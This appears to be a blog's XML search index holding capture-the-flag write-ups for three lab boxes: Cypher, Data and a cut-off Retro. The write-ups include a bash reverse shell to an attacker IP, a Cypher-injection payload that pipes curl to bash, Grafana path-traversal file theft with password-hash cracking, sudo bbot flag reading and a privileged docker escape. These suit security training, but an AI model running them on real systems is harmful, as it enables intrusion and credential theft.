<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Cypher (Linux Medium)</title>
    <url>/2025/03/14/Cypher/</url>
    <content><![CDATA[
Cypher is a Linux Medium box that starts with a website hosting a .jar file. Once downloaded and decompiled you find amongst them a CustomFunctions.class java file. Using jd-gui we are able to look at the source code of the file. The code reveals a attack vector inside a string that executes a system command. Using Cypher Injection we are able to obtain a reverse shell that gets us on the box as neo4j. Once on the box we look around to find a .yml file containing credentials. Trying with the other user gets us a shell as graphasm. We ssh in for stability, and check what permissions we have with sudo -l that reveals we can run bbot with sudo. Looking into the github and the man pages. We can force run a config through a dry run and have it abort before executing. Doing this we can obtain the root.txt file. 
Initial NmapPORT   STATE SERVICE REASON         VERSION22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMurODrr5ER4wj9mB2tWhXcLIcrm4Bo1lIEufLYIEBVY4h4ZROFj2+WFnXlGNqLG6ZB+DWQHRgG/6wg71wcElxA=|   256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEqadcsjXAxI3uSmNBA8HUMR3L4lTaePj3o6vhgPuPTi80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)| http-methods:|_  Supported Methods: GET HEAD POST OPTIONS|_http-title: Did not follow redirect to http://cypher.htb/|_http-server-header: nginx/1.24.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

HTTPLooking around we donâ€™t see much interesting, therefore we can gobuster and see whatâ€™s hiding. 
/api is interesting enough, when we scan that we only see one endpoint.
$gobuster dir -u http://cypher.htb/api/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://cypher.htb/api/[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.6[+] Timeout:                 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/auth                 (Status: 405) [Size: 31]
I presume this is an endpoint looking for authentication, therefore a POST request with something like username:password.
API EndpointSending a GET Request only provided a response in JSON telling us duhhh, most likely wants a POST Request for authentication. Also be weary as it could redirected us to /api/api/auth, so we need to remember to send our POST to /api/auth. 

Wonder if we can cause an error?? We can try a payload to see if we can get a neo4j version. Maybe we can get it to hit our server, yet fortnately we got an error which helps as well as and the version at the bottom I assuming.

HTTP/1.1 400 Bad RequestServer: nginx/1.24.0 (Ubuntu)Date: Fri, 14 Mar 2025 16:03:22 GMTContent-Length: 3257Connection: keep-aliveTraceback (most recent call last):  File &quot;/app/app.py&quot;, line 142, in verify_creds    results = run_cypher(cypher)  File &quot;/app/app.py&quot;, line 63, in run_cypher    return [r.data() for r in session.run(cypher)]  File &quot;/app/app.py&quot;, line 63, in &lt;listcomp&gt;    return [r.data() for r in session.run(cypher)]  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py&quot;, line 378, in __iter__    self._connection.fetch_message()  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py&quot;, line 178, in inner    func(*args, **kwargs)  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt.py&quot;, line 860, in fetch_message    res = self._process_message(tag, fields)  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt5.py&quot;, line 370, in _process_message    response.on_failure(summary_metadata or &#123;&#125;)  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py&quot;, line 245, in on_failure    raise Neo4jError.hydrate(**metadata)neo4j.exceptions.ClientError: &#123;code: Neo.ClientError.Statement.ExternalResourceFailed&#125; &#123;message: Invalid URL &#x27;http://10.10.14.8/?version=5.24.1&amp;name=Neo4j Kernel&amp;edition=community&#x27;: Illegal character in query at index 44: http://10.10.14.8/?version=5.24.1&amp;name=Neo4j Kernel&amp;edition=community ()&#125;During handling of the above exception, another exception occurred:Traceback (most recent call last):  File &quot;/app/app.py&quot;, line 165, in login    creds_valid = verify_creds(username, password)  File &quot;/app/app.py&quot;, line 151, in verify_creds    raise ValueError(f&quot;Invalid cypher query: &#123;cypher&#125;: &#123;traceback.format_exc()&#125;&quot;)ValueError: Invalid cypher query: MATCH (u:USER) -[:SECRET]-&gt; (h:SHA1) WHERE u.name = &#x27;admin&#x27; OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM &#x27;http://10.10.14.8/?version=&#x27; + version + &#x27;&amp;name=&#x27; + name + &#x27;&amp;edition=&#x27; + edition as l RETURN 0 as _0 //&#x27; return h.value as hash: Traceback (most recent call last):  File &quot;/app/app.py&quot;, line 142, in verify_creds    results = run_cypher(cypher)  File &quot;/app/app.py&quot;, line 63, in run_cypher    return [r.data() for r in session.run(cypher)]  File &quot;/app/app.py&quot;, line 63, in &lt;listcomp&gt;    return [r.data() for r in session.run(cypher)]  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py&quot;, line 378, in __iter__    self._connection.fetch_message()  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py&quot;, line 178, in inner    func(*args, **kwargs)  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt.py&quot;, line 860, in fetch_message    res = self._process_message(tag, fields)  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt5.py&quot;, line 370, in _process_message    response.on_failure(summary_metadata or &#123;&#125;)  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py&quot;, line 245, in on_failure    raise Neo4jError.hydrate(**metadata)neo4j.exceptions.ClientError: &#123;code: Neo.ClientError.Statement.ExternalResourceFailed&#125; &#123;message: Invalid URL &#x27;http://10.10.14.8/?version=5.24.1&amp;name=Neo4j Kernel&amp;edition=community&#x27;: Illegal character in query at index 44: http://10.10.14.8/?version=5.24.1&amp;name=Neo4j Kernel&amp;edition=community ()&#125;

Lets try sending a POST with some creds and maybe an error or mispelling.

JackPot!!! We can see what the expected expressions would be and how we should craft a payload. Lets move on for now.
Testing directory/testing looks interesting, once we check that out we find a directory listing with a .jar file.
$ gobuster dir -u http://cypher.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://cypher.htb/[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.6[+] Timeout:                 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/login                (Status: 200) [Size: 3671]/index                (Status: 200) [Size: 4562]/api                  (Status: 307) [Size: 0] [--&gt; /api/docs]/about                (Status: 200) [Size: 4986]/demo                 (Status: 307) [Size: 0] [--&gt; /login]/.                    (Status: 200) [Size: 4562]/testing              (Status: 301) [Size: 178] [--&gt; http://cypher.htb/testing/]&lt;SNIP&gt;


Once we download the file we can unzip it like a normal .zip file. Lets list whats inside first. 
$ unzip -l custom-apoc-extension-1.0-SNAPSHOT.jarArchive:  custom-apoc-extension-1.0-SNAPSHOT.jar  Length      Date    Time    Name---------  ---------- -----   ----        0  2024-09-19 01:11   META-INF/       81  2024-09-19 01:11   META-INF/MANIFEST.MF        0  2024-09-19 01:11   com/        0  2024-09-19 01:11   com/cypher/        0  2024-09-19 01:11   com/cypher/neo4j/        0  2024-09-19 01:11   com/cypher/neo4j/apoc/      547  2024-09-19 01:11   com/cypher/neo4j/apoc/CustomFunctions$StringOutput.class     1670  2024-09-19 01:11   com/cypher/neo4j/apoc/HelloWorldProcedure.class     3837  2024-09-19 01:11   com/cypher/neo4j/apoc/CustomFunctions.class      573  2024-09-19 01:11   com/cypher/neo4j/apoc/HelloWorldProcedure$HelloWorldOutput.class        0  2024-09-16 13:07   META-INF/maven/        0  2024-09-16 13:07   META-INF/maven/com.cypher.neo4j/        0  2024-09-16 13:07   META-INF/maven/com.cypher.neo4j/custom-apoc-extension/     1631  2024-09-16 13:07   META-INF/maven/com.cypher.neo4j/custom-apoc-extension/pom.xml       79  2024-09-19 01:11   META-INF/maven/com.cypher.neo4j/custom-apoc-extension/pom.properties---------                     -------     8418                     15 files

Java Debug (Source Code Analysis)Now we have some .class files. Usually written in java, we can look at the source code using jd-gui.
$ jd-gui CustomFunctions.class

This will give us a window with our function. If we look we can see it making a system call. The ClassFunctions uses shell command curl to get the HTTP status code. It suppresses the output (-s), ensures no file saved (-o &#x2F;dev&#x2F;null), and sets a connection timeout (â€“connect-timeout 1). The curl command returns the HTTP status code using the -w flag and &#123;http_code&#125;. The primary issue lies in how the URL is passed into the shell command without sufficient validation or sanitization. This is were we can append arbritrary code.

FootHold and Payload CreationFirst we make our shell:
# shell.sh/bin/bashbash -i &gt;&amp; /dev/tcp/10.10.14.8/9001 0&gt;&amp;1
Now we have to craft a payload to try and hit our server. This should grab our payload and execute.
&quot;MATCH (u:USER) -[:SECRET]-&gt; (h:SHA1) WHERE u.name = &#x27;admin&#x27; MATHC&#x27; return h.value as hashANDString statusCode = inputReader.readLine();&quot;
So our payload might look something like this:
&#123;&quot;username&quot;:&quot;admin&#x27; return h.value as a UNION CALL custom.getUrlStatusCode(\&quot;cypher.htb;curl 10.10.14.8/shell.sh|bash;#\&quot;) YIELD statusCode AS a RETURN a; //&quot;,&quot;password&quot;:&quot;Password123&quot;&#125;

ExplanationUsing this in a POST Request we send the data as JSON. Though we are injecting our payload. We use h.value or u.name as our variable a then UNION CALL the function custom.getUrlStatusCode. Inside it we have our payload, which checks the status code of cypher.htb then curls our machine and executes our code. YIELD the statusCode as our variable a and return a.RETURN a will execute our code. We use \ to escape &quot; inside the parentheses. Then // at then end to comment out everything else.

Shell as neo4jLooking around we see graphasm in /home. Going into his home we find bbot_preset.yml which reveals credentials we can try for ssh.
neo4j@cypher:/$ cd /home/cd /home/neo4j@cypher:/home$ lslsgraphasmneo4j@cypher:/home$ cd *cd *neo4j@cypher:/home/graphasm$ lslsbbot_preset.ymluser.txtneo4j@cypher:/home/graphasm$ cat bbot_preset.ymlcat bbot_preset.ymltargets:  - ecorp.htboutput_dir: /home/graphasm/bbot_scansconfig:  modules:    neo4j:      username: neo4j      password: &lt;SNIP&gt;neo4j@cypher:/home/graphasm$
Shell as graphasmUsing the creds to get in via ssh we see what we can run with permissions, if any.
graphasm@cypher:~$ sudo -lMatching Defaults entries for graphasm on cypher:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_ptyUser graphasm may run the following commands on cypher:    (ALL) NOPASSWD: /usr/local/bin/bbot

PrivEscLooking into the man pages and seeing how we can abuse this. We have a couple of different flags we can look at.
-c = custom config-y = skip scan confirmation prompt--dry-run = abort before executing scan-d = debug (verbose/more info)

So we can try something like this that might reveal the flag for us.
graphasm@cypher:~$ sudo /usr/local/bin/bbot -cy /root/root.txt -d --dry-run  ______  _____   ____ _______ |  ___ \|  __ \ / __ \__   __| | |___) | |__) | |  | | | | |  ___ &lt;|  __ &lt;| |  | | | | | |___) | |__) | |__| | | | |______/|_____/ \____/  |_| BIGHUGE BLS OSINT TOOL v2.1.0.4939rcwww.blacklanternsecurity.com/bbot[DBUG] Preset bbot_cli_main: Adding module &quot;json&quot; of type &quot;output&quot;[DBUG] Preset bbot_cli_main: Adding module &quot;stdout&quot; of type &quot;output&quot;[DBUG] Preset bbot_cli_main: Adding module &quot;python&quot; of type &quot;output&quot;[DBUG] Preset bbot_cli_main: Adding module &quot;csv&quot; of type &quot;output&quot;[DBUG] Preset bbot_cli_main: Adding module &quot;txt&quot; of type &quot;output&quot;[DBUG] Preset bbot_cli_main: Adding module &quot;aggregate&quot; of type &quot;internal&quot;[DBUG] Preset bbot_cli_main: Adding module &quot;dnsresolve&quot; of type &quot;internal&quot;[DBUG] Preset bbot_cli_main: Adding module &quot;cloudcheck&quot; of type &quot;internal&quot;[DBUG] Preset bbot_cli_main: Adding module &quot;excavate&quot; of type &quot;internal&quot;[DBUG] Preset bbot_cli_main: Adding module &quot;speculate&quot; of type &quot;internal&quot;&lt;SNIP&gt;[DBUG] internal.excavate: Including Submodule URLExtractor[DBUG] internal.excavate: Successfully loaded custom yara rules file [/root/root.txt][DBUG] internal.excavate: Final combined yara rule contents: 784fdd4e2746a92781066bdf74593aa3
This reveals the root flag.

]]></content>
      <categories>
        <category>htb</category>
      </categories>
      <tags>
        <tag>neo4j</tag>
        <tag>java decompiler</tag>
        <tag>Cypher Injection</tag>
        <tag>github custom scanners</tag>
      </tags>
  </entry>
  <entry>
    <title>Data (Linux Easy)</title>
    <url>/2024/12/21/Data/</url>
    <content><![CDATA[
Data starts out with Grafana being ran on port 3000. We are able to use Unauthorized Arbitrary File Read Vulnerability (CVE-2021-43798) and exfil grafana.ini and grafana.db. Having these we can use a python script to convert this data and hashes to sha256 for hashcat. This gets us on the box as boris. Looking at his privileges we can execute docker exec. To get root privileges on the docker container we can run sudo /snap/bin/docker exec --privileged -u 0 -it grafana /bin/bash. From here we can see the filesystem df -h and since weâ€™re root we can mkdir /tmp/pwnd and mount /dev/xXxXx /mnt/pwnd. This lets us read, write, and execute on host filesystem outside the container.
Initial NmapPORT     STATE SERVICE REASON         VERSION                                                 22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)3000/tcp open  ppp?    syn-ack ttl 62      

HTTP (Port 3000 - Grafana)Going to this shows a login page with a version number at the bottom we can use.
Researching gave us CVE-2021-43798, where we can include files using Directory Traversal. So we can exfil the grafana.ini and the grafana.db
$ curl --path-as-is http://10.10.89.74:3000/public/plugins/mysql/../../../../../../../../../../etc/grafana/grafana.ini -o grafana.ini$ curl --path-as-is http://data.vl:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db

Looking in the db file we see hashes for admin and boris. We note the password, and the salt. We can use a python script to generate sha256 hashes for use so we can crack them with hashcat.
grafana.db
CREATE TABLE `user` (                                                                          `id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL                                                , `version` INTEGER NOT NULL                                                                   , `login` TEXT NOT NULL                                                                                                                                                                       , `email` TEXT NOT NULL                                                                        , `name` TEXT NULL                                                                                                                                                                            , `password` TEXT NULL                                                                         , `salt` TEXT NULL                                                                             , `rands` TEXT NULL                                                                                                                                                                           , `company` TEXT NULL                                                                                                                                                                         , `org_id` INTEGER NOT NULL                                                                                                                                                                   , `is_admin` INTEGER NOT NULL                                                                                                                                                                 , `email_verified` INTEGER NULL                                                                                                                                                               , `theme` TEXT NULL                                                                                                                                                                           , `created` DATETIME NOT NULL                                                                                                                                                                 , `updated` DATETIME NOT NULL                                                                                                                                                                 , `help_flags1` INTEGER NOT NULL DEFAULT 0, `last_seen_at` DATETIME NULL, `is_disabled` INTEGER NOT NULL DEFAULT 0);                                                                          INSERT INTO user VALUES(1,0,&#x27;admin&#x27;,&#x27;admin@localhost&#x27;,&#x27;&#x27;,&#x27;7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8&#x27;,&#x27;YObSoLj55S&#x27;,&#x27;hLLY6QQ4Y6&#x27;,&#x27;&#x27;,1,1,0,&#x27;&#x27;,&#x27;2022-01-23 12:48:04&#x27;,&#x27;2022-01-23 12:48:50&#x27;,0,&#x27;2022-01-23 12:48:50&#x27;,0);                                                                                                               INSERT INTO user VALUES(2,0,&#x27;boris&#x27;,&#x27;boris@data.vl&#x27;,&#x27;boris&#x27;,&#x27;&lt;SNIP&gt;f4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8&#x27;,&#x27;&lt;SNIP&gt;&#x27;,&#x27;mYl941ma8w&#x27;,&#x27;&#x27;,1,0,0,&#x27;&#x27;,&#x27;2022-01-23 12:49:11&#x27;,&#x27;2022-01-23 12:49:11&#x27;,0,&#x27;2012-01-23 12:49:11&#x27;,0);

decryptor.py
import hashlibimport base64def calculate_hash(password, salt):    decoded_hash = bytes.fromhex(password)    salt_base64 = base64.b64encode(salt.encode(&#x27;utf-8&#x27;)).decode(&#x27;utf-8&#x27;)    hash_base64 = base64.b64encode(decoded_hash).decode(&#x27;utf-8&#x27;)    return f&#x27;sha256:10000:&#123;salt_base64&#125;:&#123;hash_base64&#125;&#x27;# borisboris_password = &quot;&lt;SNIP&gt;34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8&quot;boris_salt = &quot;&lt;SNIP&gt;&quot;boris_hash = calculate_hash(boris_password, boris_salt)# adminadmin_password = &quot;&lt;SNIP&gt;5cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8&quot;admin_salt = &quot;&lt;SNIP&gt;&quot;admin_hash = calculate_hash(admin_password, admin_salt)print(f&quot;[+] Boris hash: &#123;boris_hash&#125;&quot;)print(f&quot;[+] Admin hash: &#123;admin_hash&#125;&quot;)with open(&quot;hashes.txt&quot;, &quot;w&quot;) as file:    file.write(boris_hash + &quot;\n&quot;)    file.write(admin_hash + &quot;\n&quot;)

Running this script gave us hashes we can run through hashcat. 
[+] Boris hash: sha256:10000:&lt;REDACTED&gt;:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=[+] Admin hash: sha256:10000:&lt;REDACTED&gt;:epGeS76Vz1EE7fNU7i5iNO+sHKH4FCaESiTE32ExMizzcjySFkthcunnP696TCBy+Pg=
Hashcat reveals a cleartext password for boris.
hashcat (v6.2.6) starting in autodetect mode                                                                                                                                                                                                                                         Hash-mode was not specified with -m. Attempting to auto-detect hash mode.The following mode was auto-detected as the only one matching your input hash:10900 | PBKDF2-HMAC-SHA256 | Generic KDF                   Dictionary cache hit:            * Filename..: /usr/share/wordlists/rockyou.txt* Passwords.: 14344385* Bytes.....: 139921507* Keyspace..: 14344385sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:&lt;REDATED&gt;

We can login to the site, but we can also ssh in as boris.
Shell as boris$ ssh boris@data.vl  boris@data.vl&#x27;s password: Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-1060-aws x86_64)Last login: Sun Jan 23 13:11:53 2022 from 10.10.1.254boris@ip-10-10-10-11:~$
Doing some manual enumeration we find docker running, we can confirm by looking for a socket(usually &#x2F;run&#x2F;docker.sock). We also can see if we can read&#x2F;write to it.
boris@ip-10-10-10-11:~$ df -hFilesystem      Size  Used Avail Use% Mounted onudev            476M     0  476M   0% /devtmpfs            98M  876K   98M   1% /run/dev/xvda1      7.7G  1.6G  6.2G  20% /tmpfs           490M     0  490M   0% /dev/shmtmpfs           5.0M     0  5.0M   0% /run/locktmpfs           490M     0  490M   0% /sys/fs/cgroup/dev/loop0       25M   25M     0 100% /snap/amazon-ssm-agent/4046/dev/loop1       56M   56M     0 100% /snap/core18/2253/dev/loop2       43M   43M     0 100% /snap/snapd/14066/dev/loop3      117M  117M     0 100% /snap/docker/1125tmpfs            98M     0   98M   0% /run/user/1001boris@ip-10-10-10-11:~$ find / -iname docker.sock 2&gt;/dev/null/run/docker.sockboris@ip-10-10-10-11:~$ ls -lsa /run/docker.sock0 srw-rw---- 1 root root 0 Dec 22 15:31 /run/docker.sockboris@ip-10-10-10-11:~$ 
We can look at his permissions and see we can use docker as well with root privileges.
boris@ip-10-10-10-11:~$ sudo -lMatching Defaults entries for boris on ip-10-10-10-11:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser boris may run the following commands on ip-10-10-10-11:    (root) NOPASSWD: /snap/bin/docker exec *

Docker PrivEscWe can use docker to escalate our privilege. We know the docker container running is grafana. We can use the --privileged flag to create a misconfig that will allow us to access the host filesystem. Also setting our -u to 0 (root user).
boris@ip-10-10-10-11:~$ sudo /snap/bin/docker exec --privileged -u 0 -it grafana /bin/bashbash-5.1# iduid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)bash-5.1# 
Looking at the filesystem once again. We have xvda1 we can mount to, this being to the filesystem the docker container is using.
bash-5.1# df -hFilesystem                Size      Used Available Use% Mounted onoverlay                   7.7G      1.5G      6.2G  20% /tmpfs                    64.0M         0     64.0M   0% /devtmpfs                   489.3M         0    489.3M   0% /sys/fs/cgroupshm                      64.0M         0     64.0M   0% /dev/shm/dev/xvda1                7.7G      1.5G      6.2G  20% /etc/resolv.conf/dev/xvda1                7.7G      1.5G      6.2G  20% /etc/hostname/dev/xvda1                7.7G      1.5G      6.2G  20% /etc/hosts 
Letâ€™s create a folder and mount it.
bash-5.1# mkdir /tmp/pwndbash-5.1# mount /dev/xvda1 /tmp/pwndbash-5.1# ls -alis /tmp/pwnd/total 104      2      4 drwxr-xr-x   23 root     root          4096 Dec 22 15:31 . 258310      4 drwxrwxrwt    1 root     root          4096 Dec 22 17:17 ..     12      4 drwxr-xr-x    2 root     root          4096 Nov 29  2021 bin    180      4 drwxr-xr-x    3 root     root          4096 Nov 29  2021 boot    192      4 drwxr-xr-x    4 root     root          4096 Nov 29  2021 dev    206      4 drwxr-xr-x   91 root     root          4096 Dec 22 15:31 etc   1637      4 drwxr-xr-x    4 root     root          4096 Jan 23  2022 home  55945      0 lrwxrwxrwx    1 root     root            30 Nov 29  2021 initrd.img -&gt; boot/initrd.img-5.4.0-1060-aws  55943      0 lrwxrwxrwx    1 root     root            30 Nov 29  2021 initrd.img.old -&gt; boot/initrd.img-5.4.0-1060-aws   1640      4 drwxr-xr-x   20 root     root          4096 Nov 29  2021 lib   3837      4 drwxr-xr-x    2 root     root          4096 Nov 29  2021 lib64     11     16 drwx------    2 root     root         16384 Nov 29  2021 lost+found   3839      4 drwxr-xr-x    2 root     root          4096 Nov 29  2021 media   3840      4 drwxr-xr-x    2 root     root          4096 Nov 29  2021 mnt   3841      4 drwxr-xr-x    2 root     root          4096 Nov 29  2021 opt   3842      4 drwxr-xr-x    2 root     root          4096 Apr 24  2018 proc   3843      4 drwx------    5 root     root          4096 Jan 23  2022 root   3846      4 drwxr-xr-x    5 root     root          4096 Nov 29  2021 run   3849      4 drwxr-xr-x    2 root     root          4096 Nov 29  2021 sbin   4069      4 drwxr-xr-x    7 root     root          4096 Jan 23  2022 snap   4070      4 drwxr-xr-x    2 root     root          4096 Nov 29  2021 srv   4071      4 drwxr-xr-x    2 root     root          4096 Apr 24  2018 sys   4072      4 drwxrwxrwt   11 root     root          4096 Dec 22 16:49 tmp   4073      4 drwxr-xr-x   11 root     root          4096 Nov 29  2021 usr  60780      4 drwxr-xr-x   13 root     root          4096 Nov 29  2021 var  55944      0 lrwxrwxrwx    1 root     root            27 Nov 29  2021 vmlinuz -&gt; boot/vmlinuz-5.4.0-1060-aws  49497      0 lrwxrwxrwx    1 root     root            27 Nov 29  2021 vmlinuz.old -&gt; boot/vmlinuz-5.4.0-1060-awsbash-5.1# ls -alis /tmp/pwnd/root/total 28   3843      4 drwx------    5 root     root          4096 Jan 23  2022 .      2      4 drwxr-xr-x   23 root     root          4096 Dec 22 15:31 ..    181      0 lrwxrwxrwx    1 root     root             9 Jan 23  2022 .bash_history -&gt; /dev/null 256239      4 drwxr-xr-x    3 root     root          4096 Jan 23  2022 .local   3844      4 -rw-r--r--    1 root     root           148 Aug 17  2015 .profile 256089      4 drwx------    2 root     root          4096 Jan 23  2022 .ssh  56047      4 -rw-r--r--    1 root     root            37 Jan 23  2022 root.txt 256188      4 drwxr-xr-x    4 root     root          4096 Jan 23  2022 snapbash-5.1# 

]]></content>
      <categories>
        <category>vl</category>
      </categories>
      <tags>
        <tag>Grafana</tag>
        <tag>Docker Privileged Containers</tag>
      </tags>
  </entry>
  <entry>
    <title>Retro (Windows Easy)</title>
    <url>/2024/11/07/Retro/</url>
    <content><![CDATA[
Retro is a Easy Windows box working around pre-created windows 2000 machines. Pre-creating a computer means adding a computer to AD without using it to join a host to the domain right away, it just gets used later. There is a â€œPre-Windows 2000â€ compatibility option that can be selected when creating a computer from ADUC, still present in Windows Server 2022. A computer created with this option will have a password equal to the computers name in lowercase without the â€˜$â€™. This allows you to look at ADCS templates being used that are vulnerable, which leads to privilege escalation to Administrator.
Resource from Medium
Initial Nmap# Nmap 7.94SVN scan initiated Wed Nov  6 22:09:30 2024 as: /usr/lib/nmap/nmap -v -sVC -oN Evidence/Scans/initial.log 10.10.111.122Nmap scan report for 10.10.111.122Host is up (0.17s latency).Not shown: 988 filtered tcp ports (no-response)PORT     STATE SERVICE       VERSION53/tcp   open  domain        Simple DNS Plus88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-07 03:09:44Z)135/tcp  open  msrpc         Microsoft Windows RPC139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=DC.retro.vl| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.retro.vl| Issuer: commonName=retro-DC-CA| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-11-07T02:57:49| Not valid after:  2025-11-07T02:57:49| MD5:   2c4d:c0bb:3468:05c5:2f7b:1984:85e4:ad60|_SHA-1: fa13:b4c6:4349:42d2:5dd4:1948:c4be:aacf:8fd7:da21|_ssl-date: TLS randomness does not represent time445/tcp  open  microsoft-ds?464/tcp  open  kpasswd5?593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=DC.retro.vl| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.retro.vl| Issuer: commonName=retro-DC-CA| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-11-07T02:57:49| Not valid after:  2025-11-07T02:57:49| MD5:   2c4d:c0bb:3468:05c5:2f7b:1984:85e4:ad60|_SHA-1: fa13:b4c6:4349:42d2:5dd4:1948:c4be:aacf:8fd7:da21|_ssl-date: TLS randomness does not represent time3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=DC.retro.vl| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.retro.vl| Issuer: commonName=retro-DC-CA| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-11-07T02:57:49| Not valid after:  2025-11-07T02:57:49| MD5:   2c4d:c0bb:3468:05c5:2f7b:1984:85e4:ad60|_SHA-1: fa13:b4c6:4349:42d2:5dd4:1948:c4be:aacf:8fd7:da21|_ssl-date: TLS randomness does not represent time3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=DC.retro.vl| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.retro.vl| Issuer: commonName=retro-DC-CA| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-11-07T02:57:49| Not valid after:  2025-11-07T02:57:49| MD5:   2c4d:c0bb:3468:05c5:2f7b:1984:85e4:ad60|_SHA-1: fa13:b4c6:4349:42d2:5dd4:1948:c4be:aacf:8fd7:da213389/tcp open  ms-wbt-server Microsoft Terminal Services| rdp-ntlm-info:|   Target_Name: RETRO|   NetBIOS_Domain_Name: RETRO|   NetBIOS_Computer_Name: DC|   DNS_Domain_Name: retro.vl|   DNS_Computer_Name: DC.retro.vl|   Product_Version: 10.0.20348|_  System_Time: 2024-11-07T03:10:26+00:00|_ssl-date: 2024-11-07T03:11:05+00:00; -3s from scanner time.| ssl-cert: Subject: commonName=DC.retro.vl| Issuer: commonName=DC.retro.vl| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-11-06T03:06:43| Not valid after:  2025-05-08T03:06:43| MD5:   c32f:b344:a02e:2e77:7748:ca98:4f8e:3c20|_SHA-1: 2648:a57a:ffb0:819b:49a5:3f89:6fc2:54f2:9266:4e0bService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time:|   date: 2024-11-07T03:10:30|_  start_date: N/A| smb2-security-mode:|   3:1:1:|_    Message signing enabled and required|_clock-skew: mean: -2s, deviation: 0s, median: -2sRead data files from: /usr/share/nmapService detection performed. Please report any incorrect results at 